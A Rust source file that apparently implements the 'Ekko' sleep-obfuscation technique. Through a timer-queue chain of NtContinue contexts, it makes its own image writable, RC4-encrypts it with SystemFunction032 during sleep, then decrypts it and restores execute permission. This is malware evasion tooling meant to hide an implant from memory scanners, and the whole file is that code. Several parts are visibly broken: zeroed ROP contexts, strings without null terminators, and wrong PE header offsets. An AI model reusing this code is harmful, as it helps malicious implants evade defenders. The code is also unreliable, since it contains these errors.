extern crate winapi;

use std::mem;
use std::ptr::null;
use std::ptr::null_mut;
use winapi::ctypes::c_void;
use winapi::shared::ntdef::PVOID;
use winapi::um::heapapi::GetProcessHeap;
use winapi::um::libloaderapi::GetModuleHandleA;
use winapi::um::libloaderapi::GetProcAddress;
use winapi::um::libloaderapi::LoadLibraryA;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::synchapi::CreateEventW;
use winapi::um::synchapi::SetEvent;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::threadpoollegacyapiset::CreateTimerQueue;
use winapi::um::threadpoollegacyapiset::CreateTimerQueueTimer;
use winapi::um::winnt::RtlCaptureContext;
use winapi::um::winnt::CONTEXT;
use winapi::shared::ntdef::NTSTATUS;
use winapi::um::winnt::WT_EXECUTEINTIMERTHREAD;

#[repr(C)]
pub struct UString{
    length: u32,
    max_length: u32,
    buffer: *mut c_void,
}

pub fn smart_ekko(sleep_time: u32) {
    unsafe {
        let mut ctx_thread: CONTEXT = mem::zeroed();
        let mut rop_prot_rw: CONTEXT = mem::zeroed();
        let mut rop_mem_enc: CONTEXT = mem::zeroed();
        let mut rop_delay: CONTEXT = mem::zeroed();
        let mut rop_mem_dec: CONTEXT = mem::zeroed();
        let mut rop_prot_rx: CONTEXT = mem::zeroed();
        let mut rop_set_evt: CONTEXT = mem::zeroed();

        let h_timer_queue = CreateTimerQueue();

        let h_event = CreateEventW(
            null_mut(),
            0,
            0, 
            null()
        );

        let image_base = GetModuleHandleA(null());

        let dos_header = image_base as *const u32;
        let e_lfanew = *dos_header.offset(0x3C);
        let nt_headers = image_base.add(e_lfanew as usize) as *const u8;
        let optional_header = nt_headers.add(24) as *const u32; // Assuming PE32+ structure

        let image_size = *optional_header.offset(2); // SizeOfImage

        let key_buf: [u8; 16] = [0x55; 16];
        
        let key = UString{
            length: 16, 
            max_length: 16,
            buffer: key_buf.as_ptr() as *mut c_void,
        };

        let img = UString {
            length: image_size,
            max_length: image_size,
            buffer: image_base as *mut c_void,
        };

        let sys_func_032 = GetProcAddress(LoadLibraryA("Advapi32.dll".as_ptr() as *const i8), "SystemFunction032".as_ptr() as *const i8);

        let createtimerqueue = CreateTimerQueueTimer(
            &mut null_mut(), 
            h_timer_queue, 
            Some(timer_callback),
            &mut ctx_thread as *mut _ as *mut c_void,
            0,
            0,
            WT_EXECUTEINTIMERTHREAD,
        );

        if createtimerqueue != 0 {
            WaitForSingleObject(h_event, 0x32);

            rop_prot_rw.Rsp -= 8;
            rop_prot_rw.Rip = VirtualProtect as u64;
            rop_prot_rw.Rcx = image_base as u64;
            rop_prot_rw.Rdx = image_size as u64;
            rop_prot_rw.R8 = 0x04 as u64; // PAGE_READWRITE

            rop_mem_enc.Rsp -= 8;
            rop_mem_enc.Rip = sys_func_032 as u64;
            rop_mem_enc.Rcx = &img as *const _ as u64;
            rop_mem_enc.Rdx = &key as *const _ as u64;

            rop_delay.Rsp -= 8;
            rop_delay.Rip = WaitForSingleObject as u64;
            rop_delay.Rcx = GetProcessHeap() as u64;
            rop_delay.Rdx = sleep_time as u64;

            rop_mem_dec.Rsp -= 8;
            rop_mem_dec.Rip = sys_func_032 as u64;
            rop_mem_dec.Rcx = &img as *const _ as u64;
            rop_mem_dec.Rdx = &key as *const _ as u64;

            rop_prot_rx.Rsp -= 8;
            rop_prot_rx.Rip = VirtualProtect as u64;
            rop_prot_rx.Rcx = image_base as u64;
            rop_prot_rx.Rdx = image_size as u64;
            rop_prot_rx.R8 = 0x40 as u64; // PAGE_EXECUTE_READWRITE

            rop_set_evt.Rsp -= 8;
            rop_set_evt.Rip = SetEvent as u64;
            rop_set_evt.Rcx = h_event as u64;


            // CreateTimerQueueTimer(&mut ptr::null_mut(), h_timer_queue, nt_continue, &rop_prot_rw as *const _ as PVOID, 100, 0, WT_EXECUTEINTIMERTHREAD);
            // CreateTimerQueueTimer(&mut ptr::null_mut(), h_timer_queue, nt_continue, &rop_mem_enc as *const _ as PVOID, 200, 0, WT_EXECUTEINTIMERTHREAD);
            // CreateTimerQueueTimer(&mut ptr::null_mut(), h_timer_queue, nt_continue, &rop_delay as *const _ as PVOID, 300, 0, WT_EXECUTEINTIMERTHREAD);
            // CreateTimerQueueTimer(&mut ptr::null_mut(), h_timer_queue, nt_continue, &rop_mem_dec as *const _ as PVOID, 400, 0, WT_EXECUTEINTIMERTHREAD);
            // CreateTimerQueueTimer(&mut ptr::null_mut(), h_timer_queue, nt_continue, &rop_prot_rx as *const _ as PVOID, 500, 0, WT_EXECUTEINTIMERTHREAD);
            // CreateTimerQueueTimer(&mut ptr::null_mut(), h_timer_queue, nt_continue, &rop_set_evt as *const _ as PVOID, 600, 0, WT_EXECUTEINTIMERTHREAD);

            let mut h_new_timer: *mut c_void = null_mut();
            let mut delay = 100;

            for ctx in [&rop_prot_rw, &rop_mem_enc, &rop_delay, &rop_mem_dec, &rop_prot_rx, &rop_set_evt] {
                if CreateTimerQueueTimer(&mut h_new_timer, h_timer_queue, Some(nt_continue_wrapper), ctx as *const _ as PVOID, delay, 0, WT_EXECUTEINTIMERTHREAD) != 0 {
                    delay += 100;
                } else {
                    println!("Failed to create timer");
                    break;
                }
            }
        }
    }
}

extern "system" fn timer_callback(lp_parameter: *mut winapi::ctypes::c_void, _dw_timer_low_value: u8) {
    let context = lp_parameter as *mut CONTEXT;
    unsafe {
        RtlCaptureContext(context);
    }
}

extern "system" fn nt_continue_wrapper(lp_parameter: *mut winapi::ctypes::c_void, _dw_timer_low_value: u8) {
    let context = lp_parameter as *mut CONTEXT;
    unsafe {
        let nt_continue: unsafe extern "system" fn(*mut CONTEXT) -> NTSTATUS = std::mem::transmute(GetProcAddress(GetModuleHandleA("Ntdll\0".as_ptr() as *const _), "NtContinue\0".as_ptr() as *const _));
        nt_continue(context);
    }
}